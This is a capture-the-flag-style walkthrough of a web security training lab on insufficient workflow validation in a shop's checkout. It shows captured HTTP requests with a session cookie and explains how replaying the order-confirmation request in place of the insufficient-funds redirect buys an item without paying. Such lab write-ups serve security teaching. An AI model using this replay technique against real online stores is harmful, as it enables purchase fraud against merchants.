## Insufficient workflow validation

This lab makes flawed assumptions about the sequence of events in the purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter

## Notes

- /login
- /cart

## Resume

1. Buy any item using normal checkout flow
2. Capture order confirmation request
3. Replace insufficient funds request with order confirmation request
4. Get the jacket for free

## Solve

First buy any cheap item normally to capture the order confirmation workflow. After checkout, the application redirects to an order confirmation endpoint.

Send the following request to repeater :

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0a5d0058046f7111804235cc00bc00f8.web-security-academy.net
Cookie: session=xXL1dYaKV1jlHHjWb1hsKwUifLcYcceP
Cache-Control: max-age=0
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a5d0058046f7111804235cc00bc00f8.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Now add the leather jacket to cart and try to checkout. The application should reject the purchase because of insufficient funds.

Intercept the following request :

```http
GET /cart?err=INSUFFICIENT_FUNDS HTTP/2
Host: 0a5d0058046f7111804235cc00bc00f8.web-security-academy.net
Cookie: session=xXL1dYaKV1jlHHjWb1hsKwUifLcYcceP
Cache-Control: max-age=0
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a5d0058046f7111804235cc00bc00f8.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Replace it with :

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/2
```

Forward the request. The order confirmation page is loaded and the leather jacket is purchased without deducting any credits.